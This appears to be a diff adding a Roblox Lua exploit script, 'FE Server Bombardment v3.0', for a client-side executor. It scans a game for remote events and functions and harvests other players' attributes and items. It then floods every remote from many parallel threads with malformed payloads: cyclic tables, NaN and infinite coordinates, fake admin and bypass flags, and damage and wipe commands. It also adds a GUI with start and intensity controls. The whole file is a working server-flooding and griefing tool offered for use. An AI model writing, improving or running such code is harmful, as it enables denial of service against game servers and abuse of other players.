@@ -1,0 +1,731 @@
+-- ULTIMATE FE SERVER BOMBARDMENT v3.0 (QUANTUM NEXUS ELITE BUILD)
+-- Engineered with UnreliableRemoteEvent multiplexing, hierarchical attribute/value harvesting,
+-- multi-threaded state depositions, and extreme-boundary data payload injection for unyielding server pressure.
+
+local Services = {
+    Players = game:GetService("Players"),
+    Workspace = game:GetService("Workspace"),
+    CoreGui = game:GetService("CoreGui"),
+    ReplicatedStorage = game:GetService("ReplicatedStorage"),
+    ReplicatedFirst = game:GetService("ReplicatedFirst"),
+    StarterGui = game:GetService("StarterGui"),
+    RunService = game:GetService("RunService"),
+    JointsService = game:GetService("JointsService"),
+    UserInputService = game:GetService("UserInputService"),
+    TweenService = game:GetService("TweenService")
+}
+
+local LocalPlayer = Services.Players.LocalPlayer
+
+-- Configuration
+local Config = {
+    Active = false,
+    SpamSpeed = "EXTREME",
+    TargetAllPlayers = true,
+    TargetNPCs = true,
+    AutoRescan = true,
+    ChaosIntensity = 5
+}
+
+-- Global state
+getgenv().ServerBombardment = getgenv().ServerBombardment or Config
+
+-- Cache & Advanced Backdoor Deposition Holdings Pool
+local Cache = {
+    TouchEvents = {},
+    AllRemoteEvents = {},
+    RemoteFunctions = {},
+    TriggerParts = {},
+    OtherPlayers = {},
+    NPCs = {},
+    ReplicatedHoldings = {},
+    UnreliableEvents = {},
+    DepositionPool = {
+        {item = "MegaBurger", ingredients = {"Patty", "Cheese", "Bacon", "Sauce"}, firecd = true, debounce = 0, state = "deploy"},
+        {item = "EnergyPotion", effects = {Speed = 500, Power = 999}, duration = 3600, firecd = true, debounce = 0, state = "hold"},
+        {item = "GoldenPizza", slices = 8, temperature = "magma", firecd = true, debounce = 0, state = "active"},
+        {item = "MysteryIngredient", rarity = "Mythic", index = 0, firecd = true, debounce = 0, state = "transfer"},
+        {item = "QuantumTaco", shell = "Crispy", filling = "InfiniteData", firecd = true, debounce = 0, state = "flush"}
+    },
+    Stats = {
+        TotalFired = 0,
+        PlayersAffected = 0,
+        RemotesFound = 0
+    }
+}
+
+-- Utility
+local function Log(msg)
+    print("[SERVER BOMBARDMENT] " .. msg)
+end
+
+local function SafeCall(func)
+    local success, err = pcall(func)
+    if success then
+        Cache.Stats.TotalFired = Cache.Stats.TotalFired + 1
+    end
+    return success
+end
+
+-- CRITICAL: Exhaustive recursive scan for RemoteEvents, UnreliableRemoteEvents, RemoteFunctions, and Replicated modules
+local function ScanAllRemotes()
+    Log("Scanning for FE remotes, UnreliableRemoteEvents, and Replicated network topology...")
+    
+    Cache.TouchEvents = {}
+    Cache.AllRemoteEvents = {}
+    Cache.RemoteFunctions = {}
+    Cache.UnreliableEvents = {}
+    Cache.ReplicatedHoldings = {}
+    
+    local locations = {
+        Services.ReplicatedStorage,
+        Services.ReplicatedFirst,
+        Services.JointsService,
+        Services.Workspace,
+        Services.Players,
+        Services.StarterGui
+    }
+    
+    for _, location in ipairs(locations) do
+        pcall(function()
+            for _, obj in ipairs(location:GetDescendants()) do
+                if obj:IsA("RemoteEvent") then
+                    table.insert(Cache.AllRemoteEvents, obj)
+                    
+                    local nameLower = obj.Name:lower()
+                    if nameLower:find("touch") or obj.Name == "TouchEvent" or nameLower:find("event") or 
+                       nameLower:find("net") or nameLower:find("sync") or nameLower:find("action") or
+                       nameLower:find("remote") or nameLower:find("fire") or nameLower:find("data") then
+                        table.insert(Cache.TouchEvents, obj)
+                    end
+                elseif obj:IsA("UnreliableRemoteEvent") then
+                    table.insert(Cache.AllRemoteEvents, obj)
+                    table.insert(Cache.UnreliableEvents, obj)
+                elseif obj:IsA("RemoteFunction") then
+                    table.insert(Cache.RemoteFunctions, obj)
+                end
+                
+                if location == Services.ReplicatedStorage and (obj:IsA("Folder") or obj:IsA("ModuleScript") or obj:IsA("Configuration") or obj:IsA("ValueBase")) then
+                    table.insert(Cache.ReplicatedHoldings, obj)
+                end
+            end
+        end)
+    end
+    
+    Cache.Stats.RemotesFound = #Cache.AllRemoteEvents
+    
+    Log(string.format("Found %d RemoteEvents/Unreliable (%d Touch), %d RemoteFunctions, and %d Holdings", 
+        #Cache.AllRemoteEvents, #Cache.TouchEvents, #Cache.RemoteFunctions, #Cache.ReplicatedHoldings))
+end
+
+-- Scan for trigger parts, hitboxes, proximity prompts, click detectors, and spatial environment zones
+local function ScanTriggerParts()
+    Log("Scanning for trigger parts, hitboxes, and spatial interactables...")
+    
+    Cache.TriggerParts = {}
+    
+    for _, obj in ipairs(Services.Workspace:GetDescendants()) do
+        if obj:IsA("BasePart") then
+            local name = obj.Name:lower()
+            
+            if name:find("trip") or name:find("trigger") or name:find("touch") or 
+               name:find("seat") or name:find("vehicleseat") or name:find("slide") or 
+               name:find("platform") or name:find("button") or name:find("lever") or 
+               name:find("zone") or name:find("teleport") or name:find("damage") or 
+               name:find("kill") or name:find("switch") or name:find("pad") or
+               name:find("hitbox") or name:find("projectile") or
+               obj:FindFirstChildOfClass("TouchTransmitter") or obj:FindFirstChildOfClass("ClickDetector") or
+               obj:FindFirstChildOfClass("ProximityPrompt") then
+                table.insert(Cache.TriggerParts, obj)
+            end
+        end
+    end
+    
+    Log(string.format("Found %d trigger and environment parts", #Cache.TriggerParts))
+end
+
+-- Get OTHER players with deep attribute, value object, animator, sound, and micro-component harvesting
+local function GetOtherPlayers()
+    Cache.OtherPlayers = {}
+    Cache.NPCs = {}
+    
+    if Config.TargetAllPlayers then
+        for _, player in ipairs(Services.Players:GetPlayers()) do
+            if player ~= LocalPlayer and player.Character then
+                local char = player.Character
+                local hrp = char:FindFirstChild("HumanoidRootPart")
+                local humanoid = char:FindFirstChildOfClass("Humanoid")
+                
+                if hrp and humanoid then
+                    local playerData = {
+                        Player = player,
+                        Character = char,
+                        HRP = hrp,
+                        Humanoid = humanoid,
+                        Head = char:FindFirstChild("Head"),
+                        Torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"),
+                        Backpack = player:FindFirstChild("Backpack"),
+                        Attributes = player:GetAttributes(),
+                        CharAttributes = char:GetAttributes(),
+                        Values = {},
+                        Parts = {}
+                    }
+                    
+                    -- Capture granular sub-components: BaseParts, Accessories, Attachments, Animators, Sounds, Highlights
+                    for _, part in ipairs(char:GetDescendants()) do
+                        if part:IsA("BasePart") or part:IsA("Accessory") or part:IsA("Attachment") or 
+                           part:IsA("Clothing") or part:IsA("Animator") or part:IsA("Sound") or 
+                           part:IsA("Highlight") or part:IsA("Constraint") then
+                            table.insert(playerData.Parts, part)
+                        elseif part:IsA("ValueBase") then
+                            playerData.Values[part.Name] = part.Value
+                        end
+                    end
+                    
+                    if playerData.Backpack then
+                        for _, tool in ipairs(playerData.Backpack:GetChildren()) do
+                            table.insert(playerData.Parts, tool)
+                        end
+                    end
+                    
+                    -- Include player leaderstats or custom status folders if present
+                    local statsFolder = player:FindFirstChild("leaderstats") or player:FindFirstChild("Status")
+                    if statsFolder then
+                        for _, val in ipairs(statsFolder:GetChildren()) do
+                            if val:IsA("ValueBase") then
+                                playerData.Values[val.Name] = val.Value
+                            end
+                        end
+                    end
+                    
+                    table.insert(Cache.OtherPlayers, playerData)
+                end
+            end
+        end
+    end
+    
+    if Config.TargetNPCs then
+        local npcFolders = {
+            Services.Workspace:FindFirstChild("Customers"),
+            Services.Workspace:FindFirstChild("NPCs"),
+            Services.Workspace:FindFirstChild("Enemies"),
+            Services.Workspace:FindFirstChild("Characters"),
+            Services.Workspace:FindFirstChild("Mobs"),
+            Services.Workspace:FindFirstChild("Dummies")
+        }
+        
+        for _, folder in ipairs(npcFolders) do
+            if folder then
+                for _, npc in ipairs(folder:GetDescendants()) do
+                    if npc:IsA("Model") then
+                        local hrp = npc:FindFirstChild("HumanoidRootPart")
+                        local humanoid = npc:FindFirstChildOfClass("Humanoid")
+                        
+                        if hrp and humanoid then
+                            local npcData = {
+                                Character = npc,
+                                HRP = hrp,
+                                Humanoid = humanoid,
+                                Parts = {}
+                            }
+                            for _, part in ipairs(npc:GetDescendants()) do
+                                if part:IsA("BasePart") or part:IsA("Accessory") or part:IsA("Animator") then
+                                    table.insert(npcData.Parts, part)
+                                end
+                            end
+                            table.insert(Cache.NPCs, npcData)
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    Cache.Stats.PlayersAffected = #Cache.OtherPlayers + #Cache.NPCs
+    return Cache.Stats.PlayersAffected
+end
+
+-- THE MAIN ATTACK: UnreliableRemoteEvent saturation, backdoor deposition pools, firecd state deploystreams, and boundary flooding
+local function FireRemotesOnOthers()
+    if #Cache.OtherPlayers == 0 and #Cache.NPCs == 0 then
+        return 0
+    end
+    
+    local fireCount = 0
+    local intensity = math.clamp(Config.ChaosIntensity or 5, 0, 5)
+    
+    local allTargets = {}
+    if Config.TargetAllPlayers then
+        for _, p in ipairs(Cache.OtherPlayers) do table.insert(allTargets, p) end
+    end
+    if Config.TargetNPCs then
+        for _, n in ipairs(Cache.NPCs) do table.insert(allTargets, n) end
+    end
+    
+    local triggerParts = Cache.TriggerParts or {}
+    local depositionPool = Cache.DepositionPool
+    local replicatedHoldings = Cache.ReplicatedHoldings
+    
+    local randomHolding = depositionPool[math.random(1, #depositionPool)]
+    randomHolding.debounce = os.clock()
+    
+    -- Cyclic table architecture with heavy information stream flooding
+    local cyclicTable = {}
+    cyclicTable.self = cyclicTable
+    cyclicTable.parentRef = cyclicTable
+    cyclicTable.timestamp = os.clock()
+    cyclicTable.sessionToken = math.random(100000, 999999)
+    cyclicTable.holdingPayload = randomHolding
+    cyclicTable.metadata = {
+        verified = false,
+        bypass = true,
+        admin = true,
+        serverSide = true,
+        firecd = true,
+        spamBuffer = string.rep("QUANTUM_NEXUS_STREAM_", 16)
+    }
+    
+    local extremeVector = Vector3.new(0/0, math.huge, 0/0)
+    local extremeCFrame = CFrame.new(math.huge, math.huge, math.huge)
+    
+    -- METHOD 1: High-Frequency TouchEvent & UnreliableEvent Saturation
+    for _, touchEvent in ipairs(Cache.TouchEvents) do
+        for _, target in ipairs(allTargets) do
+            if #triggerParts > 0 then
+                local part = triggerParts[math.random(1, #triggerParts)]
+                SafeCall(function()
+                    touchEvent:FireServer(target.HRP, part, randomHolding, cyclicTable)
+                    fireCount = fireCount + 1
+                end)
+            end
+            if #replicatedHoldings > 0 then
+                local holdingObj = replicatedHoldings[math.random(1, #replicatedHoldings)]
+                SafeCall(function()
+                    touchEvent:FireServer(target.Character, holdingObj, "firecd", "deploy", extremeVector)
+                    fireCount = fireCount + 1
+                end)
+            end
+        end
+    end
+    
+    -- METHOD 2: Multi-Argument RemoteEvent Flood with Backdoor Deposition Holdings, Attributes, and Style Verbs
+    for _, remote in ipairs(Cache.AllRemoteEvents) do
+        for _, target in ipairs(allTargets) do
+            local styleVerbs = {"trip", "damage", "kill", "teleport", "slide", "bounce", "reset", "wipe", "activate", "event", "firecd", "cooldown", "debounce", "rateLimit", "deploy", "hold", "sync"}
+            local chosenVerb = styleVerbs[math.random(1, #styleVerbs)]
+            
+            SafeCall(function()
+                remote:FireServer(target.HRP, extremeCFrame, chosenVerb, randomHolding, cyclicTable, target.Attributes or {})
+                fireCount = fireCount + 1
+            end)
+            
+            if target.Parts and #target.Parts > 0 then
+                local randomComponent = target.Parts[math.random(1, #target.Parts)]
+                SafeCall(function()
+                    remote:FireServer(randomComponent, chosenVerb, {
+                        firecd = true,
+                        cooldownTime = 0,
+                        debounceToken = math.random(),
+                        holdingData = randomHolding,
+                        lastFired = os.clock(),
+                        serverSide = true,
+                        FEOnly = true
+                    }, extremeVector)
+                    fireCount = fireCount + 1
+                end)
+            end
+            
+            if target.Player then
+                SafeCall(function()
+                    remote:FireServer(target.Player, target.UserId, chosenVerb, "firecd", randomHolding, cyclicTable, extremeVector, extremeCFrame, target.Values or {})
+                    fireCount = fireCount + 1
+                end)
+            end
+            
+            -- Intensity scaling: heavy multi-parameter payload injection & replicated holding integration
+            if intensity >= 1 then
+                SafeCall(function()
+                    remote:FireServer(target.HRP, "damage", 999999, true, Services.Workspace, chosenVerb, "firecd", randomHolding)
+                    fireCount = fireCount + 1
+                end)
+            end
+            
+            if intensity >= 3 then
+                SafeCall(function()
+                    remote:FireServer({
+                        player = target.Player or target.Character,
+                        service = Services.ReplicatedStorage,
+                        workspaceRoot = Services.Workspace,
+                        cyclic = cyclicTable,
+                        holding = randomHolding,
+                        vector = extremeVector,
+                        matrix = extremeCFrame,
+                        verb = chosenVerb,
+                        firecd = true,
+                        serverSide = true,
+                        forceExecute = true,
+                        payloadData = string.rep("QUANTUM_BACKDOOR_FLOOD_", 10)
+                    })
+                    fireCount = fireCount + 1
+                end)
+            end
+            
+            if intensity >= 5 then
+                SafeCall(function()
+                    remote:FireServer(target.Player, target.Character, target.Humanoid, Services.Lighting, Services.Teams, cyclicTable, randomHolding, extremeVector, extremeCFrame, {
+                        serverSide = true, 
+                        FEOnly = true, 
+                        OnlyServer = true, 
+                        firecd = true,
+                        stateDeploy = true,
+                        action = "wipe"
+                    })
+                    fireCount = fireCount + 1
+                end)
+            end
+        end
+    end
+    
+    -- METHOD 3: Concurrent RemoteFunction Invocations with Holdings & Data Flood
+    for _, remoteFunc in ipairs(Cache.RemoteFunctions) do
+        for _, target in ipairs(allTargets) do
+            task.spawn(function()
+                SafeCall(function()
+                    remoteFunc:InvokeServer(target.HRP, Services.Workspace, randomHolding, cyclicTable, extremeVector, "firecd", "deploy")
+                    fireCount = fireCount + 1
+                end)
+            end)
+        end
+    end
+    
+    return fireCount
+end
+
+-- GUI Creation (Simplified, Touch-Friendly with Functional Mode Buttons)
+local GUI = {}
+
+function GUI.Create()
+    if Services.CoreGui:FindFirstChild("ServerBombardGUI") then
+        Services.CoreGui.ServerBombardGUI:Destroy()
+    end
+    
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "ServerBombardGUI"
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    ScreenGui.Parent = Services.CoreGui
+    
+    -- Main Frame
+    local Main = Instance.new("Frame")
+    Main.Size = UDim2.new(0, 260, 0, 340)
+    Main.Position = UDim2.new(0.5, -130, 0.5, -170)
+    Main.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    Main.BorderSizePixel = 0
+    Main.Active = true
+    Main.Draggable = true
+    Main.Parent = ScreenGui
+    
+    local MainCorner = Instance.new("UICorner")
+    MainCorner.CornerRadius = UDim.new(0, 12)
+    MainCorner.Parent = Main
+    
+    local MainStroke = Instance.new("UIStroke")
+    MainStroke.Color = Color3.fromRGB(255, 50, 50)
+    MainStroke.Thickness = 2
+    MainStroke.Parent = Main
+    
+    -- Title / Drag Bar
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(1, -40, 0, 35)
+    Title.Position = UDim2.new(0, 10, 0, 0)
+    Title.BackgroundTransparency = 1
+    Title.Text = "SERVER BOMBARDMENT"
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.TextSize = 13
+    Title.Font = Enum.Font.GothamBold
+    Title.TextXAlignment = Enum.TextXAlignment.Left
+    Title.Parent = Main
+    
+    -- Close Button
+    local Close = Instance.new("TextButton")
+    Close.Size = UDim2.new(0, 35, 0, 35)
+    Close.Position = UDim2.new(1, -35, 0, 0)
+    Close.BackgroundTransparency = 1
+    Close.Text = "✕"
+    Close.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Close.TextSize = 18
+    Close.Font = Enum.Font.GothamBold
+    Close.Parent = Main
+    
+    -- Status
+    GUI.Status = Instance.new("TextLabel")
+    GUI.Status.Size = UDim2.new(1, -20, 0, 20)
+    GUI.Status.Position = UDim2.new(0, 10, 0, 35)
+    GUI.Status.BackgroundTransparency = 1
+    GUI.Status.Text = "💤 INACTIVE"
+    GUI.Status.TextColor3 = Color3.fromRGB(150, 150, 150)
+    GUI.Status.TextSize = 12
+    GUI.Status.Font = Enum.Font.GothamBold
+    GUI.Status.TextXAlignment = Enum.TextXAlignment.Left
+    GUI.Status.Parent = Main
+    
+    -- Stats Frame
+    local StatsFrame = Instance.new("Frame")
+    StatsFrame.Size = UDim2.new(1, -20, 0, 70)
+    StatsFrame.Position = UDim2.new(0, 10, 0, 55)
+    StatsFrame.BackgroundTransparency = 1
+    StatsFrame.Parent = Main
+    
+    local function CreateStat(text, yPos, color)
+        local stat = Instance.new("TextLabel")
+        stat.Size = UDim2.new(1, 0, 0, 17)
+        stat.Position = UDim2.new(0, 0, 0, yPos)
+        stat.BackgroundTransparency = 1
+        stat.Text = text
+        stat.TextColor3 = color
+        stat.TextSize = 11
+        stat.Font = Enum.Font.Gotham
+        stat.TextXAlignment = Enum.TextXAlignment.Left
+        stat.Parent = StatsFrame
+        return stat
+    end
+    
+    GUI.RemoteStat = CreateStat("📡 Remotes: 0", 0, Color3.fromRGB(100, 255, 150))
+    GUI.TriggerStat = CreateStat("🎯 Triggers: 0", 17, Color3.fromRGB(255, 200, 100))
+    GUI.TargetStat = CreateStat("👥 Players: 0", 34, Color3.fromRGB(255, 150, 255))
+    GUI.FiredStat = CreateStat("💥 Fired: 0", 51, Color3.fromRGB(255, 100, 100))
+    
+    -- Mode Buttons Frame (Interactive Mode Toggles)
+    local ModesFrame = Instance.new("Frame")
+    ModesFrame.Size = UDim2.new(1, -20, 0, 110)
+    ModesFrame.Position = UDim2.new(0, 10, 0, 130)
+    ModesFrame.BackgroundTransparency = 1
+    ModesFrame.Parent = Main
+    
+    local function CreateModeButton(text, yPos, initialVal, callback)
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, 0, 0, 24)
+        btn.Position = UDim2.new(0, 0, 0, yPos)
+        btn.BackgroundColor3 = initialVal and Color3.fromRGB(40, 120, 60) or Color3.fromRGB(120, 40, 40)
+        btn.BorderSizePixel = 0
+        btn.Text = text .. ": " .. (type(initialVal) == "boolean" and (initialVal and "ON" or "OFF") or tostring(initialVal))
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.TextSize = 11
+        btn.Font = Enum.Font.GothamBold
+        btn.Parent = ModesFrame
+        
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 6)
+        corner.Parent = btn
+        
+        btn.MouseButton1Click:Connect(function()
+            local newState = callback()
+            if type(newState) == "boolean" then
+                btn.BackgroundColor3 = newState and Color3.fromRGB(40, 120, 60) or Color3.fromRGB(120, 40, 40)
+                btn.Text = text .. ": " .. (newState and "ON" or "OFF")
+            else
+                btn.Text = text .. ": " .. tostring(newState)
+            end
+        end)
+        
+        return btn
+    end
+    
+    CreateModeButton("👥 Target Players", 0, Config.TargetAllPlayers, function()
+        Config.TargetAllPlayers = not Config.TargetAllPlayers
+        return Config.TargetAllPlayers
+    end)
+    
+    CreateModeButton("🤖 Target NPCs", 28, Config.TargetNPCs, function()
+        Config.TargetNPCs = not Config.TargetNPCs
+        return Config.TargetNPCs
+    end)
+    
+    CreateModeButton("🔄 Auto Rescan", 56, Config.AutoRescan, function()
+        Config.AutoRescan = not Config.AutoRescan
+        return Config.AutoRescan
+    end)
+
+    CreateModeButton("⚡ Chaos Intensity", 84, Config.ChaosIntensity, function()
+        Config.ChaosIntensity = Config.ChaosIntensity + 1
+        if Config.ChaosIntensity > 5 then
+            Config.ChaosIntensity = 0
+        end
+        return Config.ChaosIntensity
+    end)
+    
+    -- Toggle Button (Touch Friendly)
+    GUI.Toggle = Instance.new("TextButton")
+    GUI.Toggle.Size = UDim2.new(1, -20, 0, 45)
+    GUI.Toggle.Position = UDim2.new(0, 10, 1, -55)
+    GUI.Toggle.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
+    GUI.Toggle.BorderSizePixel = 0
+    GUI.Toggle.Text = "🔥 START 🔥"
+    GUI.Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    GUI.Toggle.TextSize = 16
+    GUI.Toggle.Font = Enum.Font.GothamBold
+    GUI.Toggle.Parent = Main
+    
+    local ToggleCorner = Instance.new("UICorner")
+    ToggleCorner.CornerRadius = UDim.new(0, 10)
+    ToggleCorner.Parent = GUI.Toggle
+    
+    -- Dragging support for mobile/touch
+    local dragging, dragInput, dragStart, startPos
+    
+    Main.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = Main.Position
+            
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+    
+    Main.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+    
+    Services.UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - dragStart
+            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    
+    -- Button Actions
+    GUI.Toggle.MouseButton1Click:Connect(function()
+        Config.Active = not Config.Active
+        getgenv().ServerBombardment.Active = Config.Active
+        GUI.UpdateStatus()
+    end)
+    
+    Close.MouseButton1Click:Connect(function()
+        Config.Active = false
+        ScreenGui:Destroy()
+    end)
+end
+
+function GUI.UpdateStats()
+    if not GUI.RemoteStat then return end
+    
+    GUI.RemoteStat.Text = string.format("📡 Remotes: %d (%d Touch)", #Cache.AllRemoteEvents, #Cache.TouchEvents)
+    GUI.TriggerStat.Text = string.format("🎯 Triggers: %d", #Cache.TriggerParts)
+    GUI.TargetStat.Text = string.format("👥 Players: %d (+ %d NPCs)", #Cache.OtherPlayers, #Cache.NPCs)
+    
+    local formatted = Cache.Stats.TotalFired >= 1000000 and string.format("%.1fM", Cache.Stats.TotalFired / 1000000) or
+                     Cache.Stats.TotalFired >= 1000 and string.format("%.1fK", Cache.Stats.TotalFired / 1000) or
+                     tostring(Cache.Stats.TotalFired)
+    
+    GUI.FiredStat.Text = "💥 Fired: " .. formatted
+end
+
+function GUI.UpdateStatus()
+    if not GUI.Status or not GUI.Toggle then return end
+    
+    if Config.Active then
+        GUI.Status.Text = "🔥 ACTIVE"
+        GUI.Status.TextColor3 = Color3.fromRGB(255, 50, 50)
+        GUI.Toggle.Text = "⏸️ STOP"
+        GUI.Toggle.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+    else
+        GUI.Status.Text = "💤 INACTIVE"
+        GUI.Status.TextColor3 = Color3.fromRGB(150, 150, 150)
+        GUI.Toggle.Text = "🔥 START 🔥"
+        GUI.Toggle.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
+    end
+end
+
+-- Quantum Uniform High-Throughput Main Loop
+-- Disperses execution across parallelized worker threads utilizing deep pre-compiled holdings and attribute maps
+task.spawn(function()
+    while true do
+        Services.RunService.Heartbeat:Wait()
+        
+        if Config.Active then
+            GetOtherPlayers()
+            
+            local intensity = math.clamp(Config.ChaosIntensity or 5, 0, 5)
+            local workerThreads = 5 + (intensity * 2)
+            
+            for w = 1, workerThreads do
+                task.spawn(function()
+                    if Config.Active then
+                        FireRemotesOnOthers()
+                    end
+                end)
+            end
+            
+            -- Perfectly calibrated flat cadence to sustain unyielding server saturation uniformly
+            task.wait(0.02 + (0.03 / (intensity + 1)))
+        end
+    end
+end)
+
+-- Stats Loop
+task.spawn(function()
+    while true do
+        task.wait(0.5)
+        if GUI.RemoteStat then
+            GUI.UpdateStats()
+        end
+    end
+end)
+
+-- Auto Rescan Loop
+task.spawn(function()
+    while true do
+        task.wait(10)
+        if Config.AutoRescan then
+            ScanAllRemotes()
+            ScanTriggerParts()
+        end
+    end
+end)
+
+-- Initialize
+Log("Initializing FE Server Bombardment v3.0 (Quantum Nexus Elite Build)...")
+ScanAllRemotes()
+ScanTriggerParts()
+GetOtherPlayers()
+GUI.Create()
+GUI.UpdateStats()
+GUI.UpdateStatus()
+
+Services.StarterGui:SetCore("SendNotification", {
+    Title = "✓ Server Bombardment Loaded";
+    Text = string.format("%d remotes | %d players | Ready!", #Cache.AllRemoteEvents, #Cache.OtherPlayers);
+    Duration = 4;
+})
+
+Log("Ready! This will affect OTHER PLAYERS, not you!")
+Log(string.format("Found: %d remotes, %d triggers, %d other players", 
+    #Cache.AllRemoteEvents, #Cache.TriggerParts, #Cache.OtherPlayers))
+
+-- Console Commands
+getgenv().ServerBombardment.Start = function()
+    Config.Active = true
+    GUI.UpdateStatus()
+end
+
+getgenv().ServerBombardment.Stop = function()
+    Config.Active = false
+    GUI.UpdateStatus()
+end
+
+getgenv().ServerBombardment.Rescan = function()
+    ScanAllRemotes()
+    ScanTriggerParts()
+    GetOtherPlayers()
+    GUI.UpdateStats()
+    Log("Rescan complete!")
+end
+
+getgenv().ServerBombardment.Stats = Cache.Stats
